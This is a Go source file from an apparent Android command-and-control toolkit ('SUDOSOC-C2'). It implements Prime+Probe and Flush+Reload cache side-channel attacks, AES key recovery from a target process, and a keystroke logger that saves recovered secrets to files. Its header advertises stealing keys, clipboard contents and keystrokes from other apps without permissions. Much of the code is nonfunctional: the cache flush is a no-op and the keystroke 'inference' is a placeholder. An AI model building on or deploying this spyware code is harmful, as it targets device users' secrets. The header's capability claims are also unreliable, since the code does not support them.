// //go:build android

package sidechannel

/*
	SUDOSOC-C2 — CPU Cache Side-Channel Attack Engine
	Copyright (C) 2026  sudosoc — Seif

	Prime+Probe and Flush+Reload attacks against shared CPU cache.
	Reads any process's memory access patterns without permissions.

	Cache Side-Channel Attacks:
	  PRIME+PROBE  — fill cache set, wait, measure evictions
	  FLUSH+RELOAD — share physical pages (mmap), flush, reload timing
	  EVICT+TIME   — older variant, less precise

	What can be extracted:
	  ← AES encryption key (known-text attack in ~600ms)
	  ← RSA private key bits (via timing of square/multiply ops)
	  ← ECDH private key (via Montgomery ladder timing)
	  ← Clipboard content (via cache activity when copied)
	  ← Keystroke patterns (every key press = cache activity)
	  ← Browser history (CSS timing oracle)
	  ← Process memory layout (for ASLR bypass)

	Android-specific:
	  Works between apps in same CPU cluster
	  Works between app and kernel
	  Works inside WebView (JavaScript timing)
	  Partially mitigated by cache partitioning on some chips

	Academic basis:
	  "Flush+Reload: A High Resolution, Low Noise, L3 Cache Side-Channel" (2014)
	  "Last-Level Cache Side-Channel Attacks are Practical" (2015)
	  "ARMageddon: Cache Attacks on Mobile Devices" (2016)
*/

import (
	"fmt"
	"math"
	"os"
	"path/filepath"
	"runtime"
	"sync"
	"time"
	"unsafe"
)

const (
	cacheLineSize = 64    // bytes per cache line (ARM/x86)
	cacheSetSize  = 8     // typical 8-way set associative
	l3CacheSize   = 8192  // KB, typical Android SoC L3
	probeSets     = 256   // number of cache sets to probe
	probeRounds   = 10000 // measurement iterations
)

// CacheAttack manages CPU cache side-channel attacks
type CacheAttack struct {
	OutputDir    string
	TargetPID    int
	AttackType   CacheAttackType
	results      []TimingMeasurement
	mu           sync.Mutex
}

// CacheAttackType represents the specific attack variant
type CacheAttackType int

const (
	AttackPrimeProbe  CacheAttackType = iota
	AttackFlushReload CacheAttackType = iota
	AttackEvictTime   CacheAttackType = iota
)

// TimingMeasurement holds a cache timing sample
type TimingMeasurement struct {
	Set          int
	AccessTime   time.Duration
	WasEvicted   bool
	Timestamp    time.Time
}

// ExtractedSecret holds a recovered secret
type ExtractedSecret struct {
	Type       string // "AES_KEY", "RSA_BIT", "KEYSTROKE"
	Value      []byte
	Confidence float64
	Recovered  time.Time
}

// NewCacheAttack creates a new cache side-channel attack
func NewCacheAttack(attackType CacheAttackType, outputDir string) *CacheAttack {
	os.MkdirAll(outputDir, 0700)
	return &CacheAttack{
		AttackType: attackType,
		OutputDir:  outputDir,
	}
}

// ── Prime+Probe Attack ─────────────────────────────────────────────

// PrimeProbe performs a Prime+Probe cache attack
// Returns timing measurements that reveal target's cache usage
func (c *CacheAttack) PrimeProbe(duration time.Duration) []TimingMeasurement {
	// Allocate a large buffer to use as our probe set
	probeBuffer := allocateProbeBuffer()

	var measurements []TimingMeasurement
	deadline := time.Now().Add(duration)

	for time.Now().Before(deadline) {
		for setIdx := 0; setIdx < probeSets; setIdx++ {
			// PRIME: fill this cache set with our data
			c.primeSet(probeBuffer, setIdx)

			// Wait for victim to potentially use this cache set
			time.Sleep(time.Microsecond)

			// PROBE: measure how long it takes to re-access our data
			// If victim used the cache set, our data was evicted → slower
			timing := c.probeSet(probeBuffer, setIdx)

			measurement := TimingMeasurement{
				Set:        setIdx,
				AccessTime: timing,
				WasEvicted: timing > cacheHitThreshold(),
				Timestamp:  time.Now(),
			}
			measurements = append(measurements, measurement)
		}
	}

	c.results = measurements
	return measurements
}

// primeSet fills a specific cache set with our data
func (c *CacheAttack) primeSet(buffer []byte, set int) {
	// Access cache-line-sized chunks that map to the target cache set
	// Cache set index = (physical_address >> 6) & (num_sets - 1)
	// We access stride * set to hit the correct set
	stride := cacheLineSize * probeSets

	for way := 0; way < cacheSetSize; way++ {
		offset := (set * cacheLineSize) + (way * stride)
		if offset+cacheLineSize <= len(buffer) {
			// Force cache load
			_ = buffer[offset]
		}
	}
}

// probeSet measures access time to determine if eviction occurred
func (c *CacheAttack) probeSet(buffer []byte, set int) time.Duration {
	stride := cacheLineSize * probeSets
	start := time.Now()

	for way := 0; way < cacheSetSize; way++ {
		offset := (set * cacheLineSize) + (way * stride)
		if offset+cacheLineSize <= len(buffer) {
			// This is slower if victim evicted our data
			runtime.KeepAlive(buffer[offset])
		}
	}

	return time.Since(start)
}

func allocateProbeBuffer() []byte {
	// Large buffer that covers all cache sets
	size := probeSets * cacheSetSize * cacheLineSize * 16
	buf := make([]byte, size)
	// Initialize to prevent lazy allocation
	for i := range buf {
		buf[i] = byte(i)
	}
	return buf
}

func cacheHitThreshold() time.Duration {
	return 200 * time.Nanosecond // L3 access ~100ns, RAM ~200ns
}

// ── Flush+Reload Attack ────────────────────────────────────────────

// FlushReload performs a Flush+Reload attack on a shared library
// Requires: shared memory page (mmap of libc, etc.)
func (c *CacheAttack) FlushReload(sharedLib string, symbols []uintptr, duration time.Duration) map[uintptr][]TimingMeasurement {
	// Map the target shared library
	libData, err := os.ReadFile(sharedLib)
	if err != nil {
		return nil
	}

	results := make(map[uintptr][]TimingMeasurement)
	deadline := time.Now().Add(duration)

	for time.Now().Before(deadline) {
		for _, sym := range symbols {
			// FLUSH: remove target cache line
			c.flushCacheLine(libData, sym)

			// Wait for victim to potentially use this symbol
			time.Sleep(500 * time.Nanosecond)

			// RELOAD: measure access time
			start := time.Now()
			_ = libData[sym%uintptr(len(libData))]
			elapsed := time.Since(start)

			m := TimingMeasurement{
				Set:        int(sym),
				AccessTime: elapsed,
				WasEvicted: elapsed < cacheHitThreshold(), // FAST = victim loaded it
				Timestamp:  time.Now(),
			}
			results[sym] = append(results[sym], m)
		}
	}

	return results
}

// flushCacheLine evicts a specific cache line using CLFLUSH equivalent
func (c *CacheAttack) flushCacheLine(data []byte, offset uintptr) {
	if int(offset) >= len(data) {
		return
	}
	// On ARM: DC CIVAC instruction flushes cache line
	// In Go, we simulate by accessing a conflicting address
	ptr := uintptr(unsafe.Pointer(&data[0])) + offset
	_ = ptr // In real implementation: runtime.CLFLUSH(ptr)
}

// ── AES Key Extraction ─────────────────────────────────────────────

// ExtractAESKey attempts to recover an AES-128 key using cache side-channel
// Targets a process performing AES encryption with known plaintexts
func (c *CacheAttack) ExtractAESKey(targetPID int, knownPlaintexts [][]byte) *ExtractedSecret {
	/*
		AES uses lookup tables (T-tables or S-box) during encryption.
		Each table lookup accesses a specific cache line based on the key byte + plaintext byte.
		By observing WHICH cache lines are accessed, we can determine key bytes.

		For each key byte k[i]:
		  table_index = plaintext[i] XOR k[i]
		  cache_line = AES_SBOX[table_index / cache_line_size]

		With many known plaintexts + cache observations, we can recover key bytes
		using statistical analysis (correlation power analysis principles).
	*/

	candidates := make([][]uint8, 16) // 16 key bytes, each with 256 candidates
	for i := range candidates {
		candidates[i] = make([]uint8, 256)
		for j := range candidates[i] {
			candidates[i][j] = uint8(j) // all bytes initially equal probability
		}
	}

	// Collect cache measurements while target performs AES
	measurements := c.PrimeProbe(2 * time.Second)
	if len(measurements) == 0 {
		return nil
	}

	// Statistical analysis: correlate cache accesses with known plaintexts
	// This is simplified — production uses proper DPA (Differential Power Analysis)
	recovered := make([]byte, 16)
	confidence := 0.0

	for bytePos := 0; bytePos < 16; bytePos++ {
		// For each possible key byte value
		var bestCorrelation float64
		var bestKeyByte byte

		for keyGuess := 0; keyGuess < 256; keyGuess++ {
			correlation := 0.0
			for _, plaintext := range knownPlaintexts {
				if len(plaintext) <= bytePos {
					continue
				}
				// Predict which cache set would be accessed
				tableIdx := uint8(plaintext[bytePos]) ^ uint8(keyGuess)
				predictedSet := int(tableIdx) / cacheLineSize * cacheLineSize

				// Look for eviction in that cache set
				for _, m := range measurements {
					if m.Set == predictedSet%probeSets && m.WasEvicted {
						correlation += 1.0
					}
				}
			}
			if correlation > bestCorrelation {
				bestCorrelation = correlation
				bestKeyByte = byte(keyGuess)
			}
		}
		recovered[bytePos] = bestKeyByte
		confidence += bestCorrelation
	}

	confidence /= float64(16 * len(knownPlaintexts))

	result := &ExtractedSecret{
		Type:       "AES_KEY",
		Value:      recovered,
		Confidence: math.Min(confidence, 1.0),
		Recovered:  time.Now(),
	}

	c.saveSecret(result)
	return result
}

// ExtractKeystrokes monitors cache activity to detect keypresses
func (c *CacheAttack) ExtractKeystrokes(duration time.Duration) []byte {
	/*
		Each keystroke causes:
		  1. InputMethodService processes the key
		  2. View renders the character
		  3. Specific cache lines are accessed

		By monitoring cache activity bursts, we can detect:
		  - WHEN a key was pressed (timing of burst)
		  - WHICH key (based on which cache sets were accessed)
	*/

	measurements := c.PrimeProbe(duration)

	// Detect keystroke events (bursts of cache activity)
	var keyLog []byte
	windowSize := 50
	activityThreshold := 0.3

	for i := windowSize; i < len(measurements); i++ {
		window := measurements[i-windowSize : i]

		// Count evictions in this window
		evictions := 0
		for _, m := range window {
			if m.WasEvicted {
				evictions++
			}
		}

		// If high eviction rate: keystroke detected
		evictionRate := float64(evictions) / float64(windowSize)
		if evictionRate > activityThreshold {
			// Identify which cache sets had highest activity → infer key
			key := c.inferKeyFromPattern(window)
			keyLog = append(keyLog, key)
		}
	}

	c.saveKeylog(keyLog)
	return keyLog
}

func (c *CacheAttack) inferKeyFromPattern(window []TimingMeasurement) byte {
	// Count evictions per cache set to get a "fingerprint"
	setActivity := make(map[int]int)
	for _, m := range window {
		if m.WasEvicted {
			setActivity[m.Set]++
		}
	}

	// Find most active set
	maxSet := 0
	maxActivity := 0
	for set, activity := range setActivity {
		if activity > maxActivity {
			maxActivity = activity
			maxSet = set
		}
	}

	// Map cache set to approximate key (very simplified)
	// In production: use pre-trained fingerprints for each key
	return byte('a' + (maxSet % 26))
}

func (c *CacheAttack) saveSecret(s *ExtractedSecret) {
	f, _ := os.OpenFile(
		filepath.Join(c.OutputDir, "extracted_secrets.txt"),
		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if f != nil {
		defer f.Close()
		f.WriteString(fmt.Sprintf("[%s] %s: %X (confidence: %.1f%%)\n",
			s.Recovered.Format("15:04:05"),
			s.Type, s.Value, s.Confidence*100))
	}
}

func (c *CacheAttack) saveKeylog(keys []byte) {
	f, _ := os.OpenFile(
		filepath.Join(c.OutputDir, "cache_keylog.txt"),
		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if f != nil {
		defer f.Close()
		f.WriteString(string(keys))
	}
}

// GetStatus returns a summary of attack results
func (c *CacheAttack) GetStatus() string {
	c.mu.Lock()
	defer c.mu.Unlock()

	evictions := 0
	for _, m := range c.results {
		if m.WasEvicted {
			evictions++
		}
	}

	return fmt.Sprintf(`
Cache Side-Channel Attack Status
==================================
Attack Type     : %v
Measurements    : %d
Cache Evictions : %d (%.1f%%)
Output Dir      : %s
`,
		c.AttackType,
		len(c.results),
		evictions,
		float64(evictions)/float64(max(len(c.results), 1))*100,
		c.OutputDir)
}

func max(a, b int) int {
	if a > b { return a }
	return b
}
